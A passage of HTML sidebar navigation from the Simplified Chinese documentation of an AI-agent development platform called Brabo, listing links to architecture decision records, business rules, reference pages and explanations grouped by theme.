OpenAPI 契约生成，而不是手工复制</a></li><li><a href="../adr/0122-sessionpage-dividido-em-cinco-prs.html">ADR 0122 — `SessionPage.tsx` 拆分为五个机械式 PR，并事先声明</a></li><li><a href="../adr/0124-hook-do-canal-de-turno-do-sessionpage.html">ADR 0124 — 轮次通道的状态分组抽取到 `useTurnoDoAgente`</a></li><li><a href="../adr/0125-projectsettingstab-dividido-por-secao.html">ADR 0125 — 把 `ProjectSettingsTab.tsx` 拆分为每个分区一个文件，置于一个 barrel 之后</a></li><li><a href="../adr/0126-trilho-vertical-de-navegacao-do-projeto.html">ADR 0126 — 项目页面通过垂直轨道导航，代码标签页不再自行折叠侧边栏</a></li><li><a href="../adr/0176-sessionpage-abaixo-de-mil-linhas.html">ADR 0176 — `SessionPage.tsx` 降到 1 000 行以下，分十个机械式 PR，之后才加锁</a></li><li><a href="../adr/0181-tema-preto-neutro.html">ADR 0181 — 深色主题变为中性黑，对比度债务结束</a></li><li><a href="../adr/0210-animacao-de-texto-com-motion.html">ADR 0210 — 用 `motion` 做文本动画</a></li><li><a href="../adr/0211-uma-navegacao-so-a-sidebar-absorve-o-trilho.html">ADR 0211 — 只有一种导航：侧边栏吸收项目轨道</a></li><li><a href="../adr/0232-shadcn-com-base-ui-no-apps-web.html">ADR 0232 — `apps/web` 中使用 Base UI 的 shadcn/ui 与 Tailwind 4</a></li><li><a href="../adr/0234-shiki-e-recharts-por-carga-dinamica.html">ADR 0234 — Code Block 的 `shiki` 与 Chart 的 `recharts`，始终动态加载</a></li><li><a href="../adr/0237-o-visual-v3-liga-o-preflight-e-sobe-os-raios.html">ADR 0237 — 视觉 v3 启用 preflight 并加大圆角</a></li><li><a href="../adr/0238-o-grafo-de-modulos-vira-canvas-xyflow.html">ADR 0238 — 架构页的模块图变为 Canvas（`@xyflow/react`）</a></li><li><a href="../adr/0239-csp-frame-src-local-para-o-web-preview.html">ADR 0239 — 用于交付物 Web preview 的本地 CSP `frame-src`</a></li><li><a href="../adr/0240-o-motivo-de-controle-inerte-mora-num-ponto-de-interrogacao-nos-containers.html">ADR 0240 — 控件失效的原因可以放在容器页面的可用&quot;?&quot;中</a></li><li><a href="../adr/0241-a-sidebar-adota-o-block-sidebar-07-do-shadcn.html">ADR 0241 — 侧边栏采用 shadcn 的 `sidebar-07` block</a></li><li><a href="../adr/0242-containers-em-tabela-linear-com-tanstack-react-table.html">ADR 0242 — 容器使用 `@tanstack/react-table` 的线性表格</a></li><li><a href="../adr/0243-consequencia-irreversivel-pode-morar-num-botao-de-perigo.html">ADR 0243 — 不可逆的后果可以放在危险按钮中</a></li><li><a href="../adr/0244-coluna-das-abas-do-projeto-alinhada-a-esquerda.html">ADR 0244 — 项目标签页的列左对齐</a></li><li><a href="../adr/0248-conteudo-das-paginas-ocupa-a-largura-inteira.html">ADR 0248 — 页面内容占满整个宽度</a></li><li><a href="../adr/0250-chat-da-sessao-ocupa-a-largura-inteira.html">ADR 0250 — 会话聊天占满整个宽度</a></li></ul></li><li><span>Operação, deploy e instalação</span><ul><li><a href="../adr/0024-fase5-imagens-producao-ci.html">ADR 0024 — 阶段 5（第 1 次会话）：生产镜像、compose.prod、CI 与冒烟测试</a></li><li><a href="../adr/0025-fase5-deploy-kubernetes-kustomize.html">ADR 0025 — 阶段 5（第 2 次会话）：使用 Kustomize 部署 Kubernetes、队列指标与本地 overlay</a></li><li><a href="../adr/0026-fase5-observabilidade-e-graceful-shutdown.html">ADR 0026 — 阶段 5（第 3 次会话）：优雅关闭、OpenTelemetry、指标、日志与仪表盘</a></li><li><a href="../adr/0027-fase5-backup-hardening-release.html">ADR 0027 — 备份/还原、api 加固、暴露面与发布</a></li><li><a href="../adr/0035-observabilidade-legivel-e-trace-sem-coletor.html">ADR 0035 — 没有 collector 的 trace，以及日志中跨层的路径</a></li><li><a href="../adr/0070-observabilidade-no-compose-local.html">ADR 0070 — 本地 Compose 中的可观测性：指标和日志，没有 trace</a></li><li><a href="../adr/0150-instalador-de-uma-linha.html">ADR 0150 — 一行安装程序，带可选来源和标记文件</a></li><li><a href="../adr/0152-backup-de-volumes-contra-compose.html">ADR 0152 — 针对 compose 的卷备份与恢复</a></li><li><a href="../adr/0153-deploy-enabled-o-gatilho-que-ninguem-cria.html">ADR 0153 — `DEPLOY_ENABLED`：十份文档引用、却无人创建的触发器</a></li><li><a href="../adr/0155-a-primeira-conta-nasce-no-terminal.html">ADR 0155 — 第一个账户在终端中诞生，本地 agent 启动时即已配对</a></li><li><a href="../adr/0160-o-compose-do-instalador-viaja-assinado.html">ADR 0160 — 安装程序的 compose 随它一起传送，作为已签名的 asset</a></li><li><a href="../adr/0161-a-tela-so-oferece-o-modo-que-a-instalacao-executa.html">ADR 0161 — 界面只提供安装能执行的模式，而通过 Release 的安装没有 broker</a></li><li><a href="../adr/0162-broker-publicado-e-oferecido-pelo-instalador.html">ADR 0162 — broker 成为第五个发布的镜像，安装程序**询问**是否启用它</a></li><li><a href="../adr/0169-seaweedfs-no-lugar-do-minio-no-overlay-local.html">ADR 0169 — 本地 overlay 的 S3 目标不再是 MinIO，改为 SeaweedFS</a></li><li><a href="../adr/0170-compose-de-dev-brabo-dev.html">ADR 0170 — 开发用 compose 改名为 `brabo-dev`，开发环境拒绝在安装旁边启动</a></li><li><a href="../adr/0209-engine-em-otp-29.html">ADR 0209 — engine 升级到 Elixir 1.20.4 / OTP 29.1.1</a></li><li><a href="../adr/0256-a-migracao-restaura-o-banco-num-banco-vazio.html">ADR 0256 — A migração do instalador restaura o banco num banco recém-criado e vazio</a></li></ul></li><li><span>CI, release e cadeia de suprimentos</span><ul><li><a href="../adr/0039-actionlint-e-validacao-do-pipeline-de-ci-gerado.html">ADR 0039 — actionlint 与生成的 CI 管道的验证</a></li><li><a href="../adr/0119-imagens-publicadas-no-ghcr-por-digest.html">ADR 0119 — 每个正式 tag 都把镜像发布到 GHCR，生产 overlay 按 digest 固定</a></li><li><a href="../adr/0120-e2e-de-navegador-contra-o-compose-de-producao.html">ADR 0120 — 针对生产 compose 的浏览器 E2E，放在 workspace 之外的包中</a></li><li><a href="../adr/0121-schema-dividido-por-agregado-de-dominio.html">ADR 0121 — schema 按领域聚合拆分，置于一个 barrel 之后</a></li><li><a href="../adr/0140-timeout-do-audit-como-risco-assumido.html">ADR 0140 — `pnpm audit` 反复超时是承担的风险；发现问题仍然失败</a></li><li><a href="../adr/0149-assinatura-dos-artefatos-publicados.html">ADR 0149 — 已发布工件的签名</a></li><li><a href="../adr/0159-imagem-de-terceiro-por-digest.html">ADR 0159 — 第三方镜像按 digest 引入，lint 让忘记的人失败</a></li><li><a href="../adr/0172-trivy-no-release-antes-de-assinar.html">ADR 0172 — 发布在签名之前按 digest 用 Trivy 扫描它所发布的东西</a></li><li><a href="../adr/0178-tag-inline-na-imagem-de-terceiro.html">ADR 0178 — 第三方镜像的 tag 住在引用**之内**，位于 digest 之前</a></li><li><a href="../adr/0197-a-imagem-dos-workflows-vem-do-compose.html">ADR 0197 — workflow 的镜像来自 compose，并启用镜像的 Dependabot</a></li><li><a href="../adr/0252-o-brabo-vira-um-conjunto-de-repositorios.html">ADR 0252 — Brabo 变成 `viralabs-dev` 中的一组仓库</a></li></ul></li><li><span>Documentação</span><ul><li><a href="../adr/0029-sincronizacao-continua-da-documentacao.html">ADR 0029 — 文档的持续同步</a></li><li><a href="../adr/0033-referencia-de-api-gerada-do-openapi.html">ADR 0033 — API 参考由代码产出，表格测试对元数据提出要求</a></li><li><a href="../adr/0034-documentacao-publicada-por-degrau.html">ADR 0034 — 按阶梯发布的文档，位于 Pages 的子目录中</a></li><li><a href="../adr/0071-publicacao-simetrica-por-degrau.html">ADR 0071 — 按阶梯对称发布，以及一个供选择的根</a></li><li><a href="../adr/0073-o-caminho-publicado-nomeia-o-ambiente.html">ADR 0073 — 发布路径命名的是环境，而不是分支</a></li><li><a href="../adr/0117-lockfile-proprio-para-o-website.html">ADR 0117 — `website/` 拥有自己的 lockfile，脱离产品的 `pnpm audit`</a></li><li><a href="../adr/0202-o-indice-de-adr-por-tema.html">ADR 0202 — 按主题组织的 ADR 索引，主题放在 ADR 之外</a></li><li><a href="../adr/0206-referencia-da-api-numa-pagina-redoc.html">ADR 0206 — API 参考变成一个 Redoc 页面</a></li><li><a href="../adr/0216-quatro-idiomas-com-pt-br-como-fonte.html">ADR 0216 — 四种语言，以 pt-BR 作为**来源**和默认：文档与界面提供葡萄牙语、英语、俄语和简体中文</a></li><li><a href="../adr/0218-titulo-de-adr-com-prefixo.html">ADR 0218 — 每个 ADR 都命名为“ADR NNNN — 标题”</a></li><li><a href="../adr/0219-referencia-entra-na-traducao.html">ADR 0219 — 参考文档纳入翻译</a></li><li><a href="../adr/0220-api-traduzida-por-catalogo.html">ADR 0220 — API 页面按目录翻译</a></li><li><a href="../adr/0253-o-site-de-docs-deixa-o-docusaurus.html">ADR 0253 — 文档站点离开 Docusaurus</a></li><li><a href="../adr/0254-a-doc-de-cada-area-mora-na-raiz-dela.html">ADR 0254 — 每个领域的文档位于它自己的根目录</a></li><li><a href="../adr/0260-doc-dos-repos-de-codigo-so-em-ingles.html">ADR 0260 — 代码仓库的文档只用英文；站点以横幅提供英文原文</a></li></ul></li></ul></li></ul></section><section><h2>📐 规则</h2><ul><li><a href="../business-rules.html">业务规则</a></li><li><a href="../business-rules/custo.html">成本与计量</a></li><li><a href="../business-rules/autenticacao.html">认证</a></li><li><a href="../business-rules/api.html">API</a></li><li><a href="../business-rules/broker.html">Broker</a></li><li><a href="../business-rules/ci.html">CI</a></li><li><a href="../business-rules/contracts.html">Contratos</a></li><li><a href="../business-rules/engine.html">Engine</a></li><li><a href="../business-rules/infra.html">Infra</a></li><li><a href="../business-rules/produto.html">Produto</a></li><li><a href="../business-rules/runner.html">Runner</a></li><li><a href="../business-rules/web.html">Web</a></li></ul></section><section><h2>📖 参考</h2><ul><li><a href="../reference/configuration.html">Configuração</a></li><li><a href="../reference/events.html">Eventos</a></li><li><a href="../reference/permissions.html" aria-current="page">Permissões</a></li><li><a href="../reference/artifacts.html">Artefatos</a></li><li><a href="../reference/git-providers.html">Provedores de git</a></li><li><a href="../reference/internal-api.html">API interna</a></li><li><a href="../reference/scripts.html">Scripts e comandos</a></li><li><a href="../reference/rulesets.html">Rulesets do repositório</a></li><li><a href="../reference/paridade-de-traducao.html">Paridade de tradução</a></li><li><a href="../reference/brb.html">Registro BRB</a></li><li><a href="../security-surface.html">api 的暴露面</a></li><li><span>API 参考</span></li></ul></section><section><h2>💡 解释</h2><ul><li><span>流程与流水线</span><ul><li><a href="../explanation/documentation-workflow.html">文档同步</a></li><li><a href="../explanation/branching-policy.html">分支策略</a></li><li><a href="../explanation/cadeia-de-suprimentos-do-ci.html">CI 的供应链</a></li><li><a href="../explanation/release-do-produto.html">产品发布</a></li><li><a href="../explanation/gates.html">gates，以及如何测量它们</a></li><li><a href="../explanation/observability.html">可观测性</a></li><li><a href="../explanation/modelo-de-time.html">团队模型与交付物流程</a></li></ul></li><li><span>验证与测量</span><ul><li><a href="../explanation/primeiro-dogfooding.html">第一次 dogfooding</a></li><li><a href="../explanation/execucao-real-hello-world.html">真实执行（hello world）</a></li><li><a href="../explanation/achados-execucao-real.html">流水线真实执行中的发现</a></li><li><a href="../explanation/validacao-fase-12.html">Fase 12 的验证</a></li><li><a href="../explanation/validacao-real.html">真实验证（13b）</a></li><li><a href="../explanation/aceite-providers.html">provider 的验收</a></li><li><a href="../explanation/medicao-do-idioma.html">语言启发式的测量</a></li><li><a href="../explanation/medicao-do-jev.html">Jev 工具路由器的测量</a></li><li><a href="../explanation/auditoria-fluxo-vs-codigo.html">审计：fluxo.yml × 代码（v3，ADR 0085）</a></li><li><a href="../explanation/auditoria-visual-rodada-29.html">视觉审计：Rodada 29 之前与之后</a></li></ul></li><li><span>阶段历史</span><ul><li><a href="../explanation/historico-de-fases.html">阶段历史</a></li><li><a href="../explanation/fase-28-pasta-do-usuario.html">FASE 28 — 用户的目录</a></li><li><a href="../explanation/fase-29-instalacao-de-uma-linha.html">FASE 29 — 一行命令安装</a></li><li><a href="../explanation/fase-30-runner-por-maquina.html">FASE 30——机器的本地智能体</a></li><li><a href="../explanation/backlog.html">已分类的 backlog</a></li></ul></li><li><span>本地化</span><ul><li><a href="../explanation/localizacao.html">本地化</a></li><li><a href="../explanation/localizacao-en.html">本地化——英语（en）</a></li><li><a href="../explanation/localizacao-ru.html">本地化——俄语（ru）</a></li><li><a href="../explanation/localizacao-zh-hans.html">本地化——简体中文（zh-Hans）</a></li></ul></li><li><span>技术笔记</span><ul><li><a href="../explanation/tanstack-ai.html">TanStack AI——未采用</a></li></ul></li></ul></section><section><h2>🛠️ 运维</h2><ul><li><a href="../runbook.html">运维手册</a></li></ul></section><section><h2>📚 词汇</h2><ul><li><a href="../glossary.html">术语表</a></li></ul></section><section><h2>🤝 贡献</h2><ul><li><a href="https://github.com/viralabs-dev/brabo/blob/dev/CONTRIBUTING.md">如何贡献</a></li><li><a href="https://github.com/viralabs-dev/brabo/blob/dev/SUPPORT.md">在哪里求助</a></li><li><a href="https://github.com/viralabs-dev/brabo/blob/dev/SECURITY.md">报告漏洞</a></li></ul></section></nav>
+<nav class="site-side" aria-label="docs"><section><h2>🚀 从这里开始</h2><ul><li><a href="../index.html">简介</a></li><li><a href="../getting-started.html">快速开始</a></li><li><a href="../tutorials/from-zero-to-deliverable.html">从零到交付物</a></li><li><a href="../tutorials/interface-antes-e-depois-shadcn.html">shadcn 前后的界面（2026 年 10 月 31 日）</a></li></ul></section><section><h2>🏗️ 架构</h2><ul><li><a href="../architecture.html">架构</a></li><li><a href="../adr.html">决策（ADR）</a><ul><li><span>Git, repositório e política de branches</span><ul><li><a href="../adr/0001-git-provider-contract-shape.html">ADR 0001 — GitProvider 规范化契约的形态</a></li><li><a href="../adr/0002-git-error-normalization.html">ADR 0002 — GitProvider 错误的规范化</a></li><li><a href="../adr/0003-git-provider-retry-policy.html">ADR 0003 — 远程 provider 的重试策略</a></li><li><a href="../adr/0004-git-credential-registration.html">ADR 0004 — 用户 git 凭据的登记</a></li><li><a href="../adr/0005-repo-bootstrap-idempotent-steps.html">ADR 0005 — 幂等且可恢复的 Gitflow bootstrap</a></li><li><a href="../adr/0028-protecao-de-branch-divergencia-entre-providers.html">ADR 0028 — 分支保护：provider 之间的分歧与审批矩阵</a></li><li><a href="../adr/0030-politica-de-branches-mecanizada.html">ADR 0030 — 机制化的分支策略</a></li><li><a href="../adr/0044-adocao-de-repositorio-existente.html">ADR 0044 — 采纳现有仓库，以及作为关口的计划</a></li><li><a href="../adr/0056-o-engine-trabalha-em-repositorio-remoto.html">ADR 0056 — engine 在远程仓库上工作</a></li><li><a href="../adr/0139-o-alarme-de-esteira-ganha-destinatario.html">ADR 0139 — 流水线合并的告警获得接收方，以及 `dev` 的规则</a></li><li><a href="../adr/0165-o-repositorio-nasce-no-handoff-ao-arquiteto.html">ADR 0165 — 仓库在接受给 Arquiteto 的 handoff 时诞生，没有它执行就不会开始</a></li><li><a href="../adr/0217-promocao-automatica-para-qa-em-fase-de-teste.html">ADR 0217 — QA 处于测试阶段时，`dev` → `qa` 自动晋升</a></li><li><a href="../adr/0235-a-qa-e-aposentada-e-a-esteira-fica-dev-e-main.html">ADR 0235 — `qa` 暂时退役，仓库的流水线变为 `dev → main`</a></li><li><a href="../adr/0236-o-dependabot-dispensa-revisao-na-dev.html">ADR 0236 — Dependabot 在 `dev` 上免于审查，其他检查全绿即可合并</a></li><li><a href="../adr/0255-politica-de-pr-obrigatoria-em-todos-os-repos.html">ADR 0255 — A política de PR é obrigatória em todos os repositórios e a PR de regeneração do bot dispensa a escada na dev</a></li></ul></li><li><span>Harness de agente, turnos e sessões</span><ul><li><a href="../adr/0006-prompt-assembler-context-harness.html">ADR 0006 — agent 的 harness：确定性的上下文组装</a></li><li><a href="../adr/0007-toolloop-tools-context-manager.html">ADR 0007 — ToolLoop、工具、ContextManager（带 LLM 的 harness）</a></li><li><a href="../adr/0061-tipo-da-sessao-na-criacao.html">ADR 0061 — 会话的类型是创建时的数据，而执行仍然是事件</a></li><li><a href="../adr/0098-limites-de-transporte-e-janela-efetiva-de-compactacao.html">ADR 0098 — 一致的传输限制与有效的压缩窗口</a></li><li><a href="../adr/0163-o-clique-responde-ao-aceitar.html">ADR 0163 — 点击在**接受**命令时响应，轮次经由通道继续</a></li><li><a href="../adr/0175-infra-lead-conversa-pelo-composer.html">ADR 0175 — Infra Lead 通过 composer 对话，在此之前它的回合先经过 `TurnoAssincrono`</a></li><li><a href="../adr/0177-idioma-das-respostas-por-conta-sessao-e-projeto.html">ADR 0177 — 回答的语言存放在三个地方——账户、会话和项目——采用开放的 BCP-47 列表，绝不放在 `users.locale` 中</a></li><li><a href="../adr/0179-o-laco-pergunta-ao-jev-qual-ferramenta.html">ADR 0179 — 循环向 Jev 询问用哪个工具，用户的模型只看到剩下的菜单</a></li><li><a href="../adr/0183-reabrir-sessao-encerrada.html">ADR 0183 — 已结束的会话可以重新打开：终止状态的专属出口，通向 `active`，带新事件</a></li><li><a href="../adr/0184-reabrir-sessao-decisoes-do-dono.html">ADR 0184 — 重新打开会话：所有者的三个决定，`developer` 即可重新打开</a></li><li><a href="../adr/0191-a-mensagem-com-turno-em-curso-entra-numa-fila.html">ADR 0191 — 在轮次进行中到达的消息进入持久化队列，并在轮次结束时被读取</a></li><li><a href="../adr/0226-diario-vivo-e-retomada-dos-agentes.html">ADR 0226 — 活的日志与智能体恢复：被中断的回合凭计划恢复一次</a></li><li><a href="../adr/0246-anexos-do-chat-bytes-no-postgres-referencia-no-evento.html">ADR 0246 — 聊天附件：字节存于 Postgres，事件中存引用，视觉能力由 capability 决定</a></li><li><a href="../adr/0247-uma-mensagem-varios-destinatarios.html">ADR 0247 — 一条消息，多个收件人</a></li><li><a href="../adr/0249-o-raciocinio-do-agente-e-gravado-e-mostrado-so-a-developer.html">ADR 0249 — 智能体的推理被记录，且仅向 developer 及以上显示</a></li></ul></li><li><span>O time de agentes — papéis, áreas e handoffs</span><ul><li><a href="../adr/0008-agente-criativo-conversacional-handoffs.html">ADR 0008 — harness 中的对话式 Criativo agent + handoff 的基础</a></li><li><a href="../adr/0009-agente-po-backlog-rastreabilidade.html">ADR 0009 — PO agent、backlog（epics/stories/tasks）与可追溯性</a></li><li><a href="../adr/0010-agente-arquiteto-adr-pr-module-map.html">ADR 0010 — Arquiteto agent：通过真实 PR 的 ADR、module_map 和交叉验证</a></li><li><a href="../adr/0014-infra-agent-painel-phoenix.html">ADR 0014 — InfraAgent 与实时团队面板（Fase 4a 收尾）</a></li><li><a href="../adr/0015-psicologo-real-toolloop-hipoteses-evidencia.html">ADR 0015 — 真正的 Psicólogo：ToolLoop、带证据的假设与成本分诊</a></li><li><a href="../adr/0016-anamnese-proficiencia-patches-instrucao.html">ADR 0016 — Anamnese：熟练度画像、指令补丁与闭环</a></li><li><a href="../adr/0022-fechamento-4b-psicologo.html">ADR 0022 — 阶段 4b 的收尾（第 1 次会话）：能送达的证据、能显示的成本、能在 kill 之后存活的分析</a></li><li><a href="../adr/0023-fechamento-4b-anamnese.html">ADR 0023 — 阶段 4b 的收尾（第 2 次会话）：能工作的目录、能区分谁拒绝的去重，以及能在一轮之后存活的队列</a></li><li><a href="../adr/0038-hierarquia-de-agentes.html">ADR 0038 — agent 的层级：领域、lead 与委派</a></li><li><a href="../adr/0046-promocao-de-story-com-autoridade-do-usuario.html">ADR 0046 — 由用户拥有权限的故事晋升</a></li><li><a href="../adr/0053-dev-lead-e-paralelismo-autorizado.html">ADR 0053 — Dev Lead 作为区域，以及由用户授权的并行</a></li><li><a href="../adr/0068-diagrama-c4-do-arquiteto.html">ADR 0068 — Arquiteto 的 C4 图</a></li><li><a href="../adr/0069-fusao-condicional-do-handoff-com-a-ativacao-de-execucao.html">ADR 0069 — 有条件地合并 handoff 的接受与执行的启用</a></li><li><a href="../adr/0085-fluxo-como-registro-declarativo.html">ADR 0085 — 角色流作为声明式登记（fluxo.yml）</a></li><li><a href="../adr/0086-dev-lead-plano-suspende-para-aprovacao.html">ADR 0086 — Dev Lead 的计划挂起轮次以等待审批</a></li><li><a href="../adr/0087-ux-designer-agente.html">ADR 0087 — UX Designer 作为对话式 agent 加入</a></li><li><a href="../adr/0088-staff-agente-dormente-para-disparo-automatico.html">ADR 0088 — Staff：代码就绪，自动触发处于休眠</a></li><li><a href="../adr/0089-analytics-e-delivery-metricas-como-relatorio.html">ADR 0089 — `analytics` 和 `delivery-metricas` 成为报表脚本</a></li><li><a href="../adr/0092-platform-relatorio-de-telemetria-sob-demanda.html">ADR 0092 — `platform` 以按需报告脚本的形式诞生，而不是 agent</a></li><li><a href="../adr/0093-dbre-linter-de-migracao-e-relatorio-de-backup.html">ADR 0093 — `dbre` 角色变成两个脚本：迁移 linter 和备份报告</a></li><li><a href="../adr/0094-delegacao-dev-lead-vira-dado.html">ADR 0094 — Dev Lead → dev 的委派成为数据，`parecerArtifactId` 被重新定义</a></li><li><a href="../adr/0109-handoff-manual-a-agente-a-escolha.html">ADR 0109 — 向任选 agent 的手动 handoff 复用&quot;提供 + 接受&quot;，绝不引入第三种 handoff 状态</a></li><li><a href="../adr/0182-ciclo-de-vida-do-handoff.html">ADR 0182 — handoff 提议获得生命周期：每个目标一个待处理，以及 `superseded`</a></li><li><a href="../adr/0185-estou-pronto-fecha-os-dois-gates.html">ADR 0185 — &quot;Estou pronto — a necessidade está validada&quot;：一次点击同时关闭就绪确认、gate `necessidade-validada` 和 PO 的接受</a></li><li><a href="../adr/0186-aceite-automatico-do-handoff-ao-arquiteto.html">ADR 0186 — 当 backlog 已覆盖且仓库为本地时，PO 给 Arquiteto 的 handoff 无需点击即被接受</a></li><li><a href="../adr/0194-aprovar-o-plano-ativa-a-execucao.html">ADR 0194 — 批准 Dev Lead 的计划会激活执行，任务获得它所分配的模块</a></li><li><a href="../adr/0212-historia-arquivada.html">ADR 0212 — 已归档的故事：一列，而不是状态机中的一个状态</a></li><li><a href="../adr/0213-o-entregavel-roda-na-maquina-pelo-compose-da-infra.html">ADR 0213 — 交付物通过 Infra 的 compose 在用户的机器上运行</a></li><li><a href="../adr/0259-o-modulo-de-que-outros-dependem-tem-dono.html">ADR 0259 — 被其他模块依赖的模块在执行计划中必须有负责人</a></li></ul></li><li><span>Gates, QA e revisão de segurança</span><ul><li><a href="../adr/0013-gates-qa-secops-pr.html">ADR 0013 — PR 的 gate：QAAgent 和 SecOpsAgent</a></li><li><a href="../adr/0020-destravar-gates-qa-secops.html">ADR 0020 — 解锁 QA 与 SecOps 的 gate：在工作树上运行 gitleaks、经过校验的意见书，以及文本形式的 tool call</a></li><li><a href="../adr/0021-fechamento-4a-infra-e-painel.html">ADR 0021 — 阶段 4a 的收尾：真正做校验的 infra gate，以及说真话的面板</a></li><li><a href="../adr/0054-gates-como-registro-declarativo.html">ADR 0054 — gate 作为声明式登记</a></li><li><a href="../adr/0057-o-gate-espera-a-aprovacao.html">ADR 0057 — gate agent 等待审批，就像 dev 那样等待</a></li><li><a href="../adr/0067-o-gate-sobrevive-ao-restart.html">ADR 0067 — gate 在重启后存活</a></li><li><a href="../adr/0090-qa-estrategia-e-appsec-segundo-momento.html">ADR 0090 — QA 策略和 AppSec 作为第二个**时刻**，而不是新 agent</a></li><li><a href="../adr/0091-secops-runtime-relatorio-de-abuso.html">ADR 0091 — `secops-runtime` 作为基于 `rate_limit_hits` 的报告脚本</a></li><li><a href="../adr/0095-gate-necessidade-validada.html">ADR 0095 — gate `necessidade-validada` 由单独的人工确认关闭，而不是由 Criativo 自我验证</a></li><li><a href="../adr/0123-golden-set-regressao-qa-automacao.html">ADR 0123 — 为 QA Automação agent 的语义判断建立回归用例 golden-set</a></li><li><a href="../adr/0168-golden-set-do-qa-em-ci-semanal.html">ADR 0168 — QA 的 golden-set 开始在 CI 中按周定时运行</a></li><li><a href="../adr/0192-plano-de-teste-depois-da-entrega.html">ADR 0192 — 测试计划在 dev 交付之后诞生，gate `implementavel` 改为基于故事和 `module_map` 进行判断</a></li><li><a href="../adr/0207-ciclo-de-gate-velho-estaciona.html">ADR 0207 — 停滞超过 2 小时的 gate 周期会被搁置，只有人工操作才能恢复</a></li><li><a href="../adr/0214-pergunta-em-aberto-vira-pendencia.html">ADR 0214 — 悬而未决的问题成为待解决的待办</a></li><li><a href="../adr/0215-decisao-do-projeto-chega-ao-dev-e-ao-qa.html">ADR 0215 — 项目的决定传达到 dev 和 QA</a></li><li><a href="../adr/0258-a-resposta-pelo-chat-fecha-a-pergunta-em-aberto.html">ADR 0258 — 在聊天中给出的回答关闭悬而未决的问题</a></li></ul></li><li><span>Execução, política de terminal e aprovações</span><ul><li><a href="../adr/0011-infra-dev-agents-worktrees-merge-lock.html">ADR 0011 — dev agent 的基础设施：worktree、git 执行器和合并锁</a></li><li><a href="../adr/0012-dev-agent-real-toolloop-orcamento-bloqueio.html">ADR 0012 — 真正的 DevAgent：ToolLoop、按 task 的预算与阻塞纪律</a></li><li><a href="../adr/0017-lock-de-workspace-e-monitor-de-dev-agents.html">ADR 0017 — 工作区初始化锁、dev agent 的 Monitor 以及上限继承</a></li><li><a href="../adr/0018-noop-dev-agent-modo-de-execucao.html">ADR 0018 — NoopDevAgent 作为永久的执行模式</a></li><li><a href="../adr/0019-destravar-dev-agent-adr-por-modulo-orcamento-projeto.html">ADR 0019 — 解锁真实的 DevAgent：写入、终端、按模块的 ADR 和按项目的预算</a></li><li><a href="../adr/0045-reagendamento-por-evento-do-dev-agent.html">ADR 0045 — dev agent 的按事件重新调度，以及熔断器</a></li><li><a href="../adr/0047-operabilidade-pos-dogfooding.html">ADR 0047 — dogfooding 之后的可运维性：Fase 12 的收尾</a></li><li><a href="../adr/0048-decisao-no-log-e-a-ordem-do-gate.html">ADR 0048 — event log 中的决定，以及 gate 的顺序</a></li><li><a href="../adr/0052-dev-agent-espera-aprovacao-no-meio-do-laco.html">ADR 0052 — dev agent 在循环中途等待审批</a></li><li><a href="../adr/0055-escopo-de-caminho-na-politica-de-terminal.html">ADR 0055 — 终端策略中的路径范围</a></li><li><a href="../adr/0102-revisao-do-adr-0065-teto-absoluto-substitui-deny.html">ADR 0102 — 修订 ADR 0065：外部效果的边界不再是 `deny`，而是绝对上限</a></li><li><a href="../adr/0167-modo-automatico-libera-o-escopo-de-caminho.html">ADR 0167 — 自动模式放行路径范围，而且只有它放行</a></li><li><a href="../adr/0189-o-piloto-automatico.html">ADR 0189 — 自动驾驶：自动模式批准一切（上限除外），作用域与真实执行目录比较，&quot;始终允许&quot;记录动词 + 子命令</a></li><li><a href="../adr/0204-modo-automatico-libera-push-e-pr.html">ADR 0204 — 自动模式放行 push 和 PR</a></li></ul></li><li><span>Onde o código mora — modos de execução</span><ul><li><a href="../adr/0066-nome-de-pasta-legivel-do-workspace.html">ADR 0066 — 可读的 workspace 文件夹名称</a></li><li><a href="../adr/0072-projeto-local-ou-container.html">ADR 0072 — 项目选择代码存放在哪里：用户目录还是托管目录</a></li><li><a href="../adr/0104-execution-mode-tres-valores-e-workspace-verificado-pelo-runner.html">ADR 0104 — `execution_mode` 取三个值，由 runner 负责验证时 workspace 以 `unverified` 诞生</a></li><li><a href="../adr/0107-navegacao-de-pasta-local-via-o-runner.html">ADR 0107 — 通过 Runner 浏览本地文件夹</a></li><li><a href="../adr/0108-projeto-runner-nasce-ao-navegar-pasta-no-wizard.html">ADR 0108 — 在 `runner` 模式下，项目在点击“Navegar pasta...”时诞生，而不只是在确认时</a></li><li><a href="../adr/0111-conversao-de-execution-mode-de-projeto-existente.html">ADR 0111 — 转换已有项目的 `execution_mode`：dev agent 活动时拒绝，迁移 `permissions.json`，退役容器行</a></li><li><a href="../adr/0141-base-unica-dos-projetos-montados.html">ADR 0141 — 挂载项目的唯一 base，按同一路径挂载</a></li><li><a href="../adr/0142-validacao-de-workspace-montado-adiada.html">ADR 0142 — 挂载 workspace 的验证推迟到实体化时进行</a></li><li><a href="../adr/0146-base-consentida-no-bootstrap.html">ADR 0146 — 在 bootstrap 中经同意设定的 base，以及 `mounted` 作为本地默认值</a></li></ul></li><li><span>Container do projeto e broker</span><ul><li><a href="../adr/0065-container-por-projeto-a-fronteira-deixa-de-ser-politica.html">ADR 0065 — 每个项目一个容器：边界不再是策略</a></li><li><a href="../adr/0081-ciclo-de-vida-do-container-tabela-sem-orquestrador.html">ADR 0081 — 容器生命周期：状态表，没有编排器</a></li><li><a href="../adr/0083-terminal-mostra-estado-real-do-container.html">ADR 0083 — 终端标签页获得生命周期的真实使用者，而不是终端</a></li><li><a href="../adr/0128-porta-de-docker-e-a-prova-de-empacotamento.html">ADR 0128 — Docker 端口，以及选定实现的打包证明</a></li><li><a href="../adr/0130-broker-de-container.html">ADR 0130 — 容器 broker：谁与服务器的 Docker 对话，以及它为什么不接受规格</a></li><li><a href="../adr/0131-roteamento-de-modulos-para-infra.html">ADR 0131 — Arquiteto 把模块路由给 infra：它**提名**，Infra **选定**</a></li><li><a href="../adr/0133-infra-elege-imagem-do-roteamento.html">ADR 0133 — Infra 在路由的候选项中做出选择，选择结果成为 `artifact.project_image` 的新版本</a></li><li><a href="../adr/0134-dev-agents-executam-dentro-do-container.html">ADR 0134 — dev agent 在项目的真实容器**内部**执行，终端在其中获得一个自动批准的下限</a></li><li><a href="../adr/0135-portao-de-imagem-nos-tres-modos.html">ADR 0135 — Arquiteto 的镜像关口（RN-105）开始在三种执行模式下生效</a></li><li><a href="../adr/0136-pagina-global-de-containers.html">ADR 0136 — 全局容器页面：broker 按加载设上限，`container_remove` 纳入绝对上限</a></li><li><a 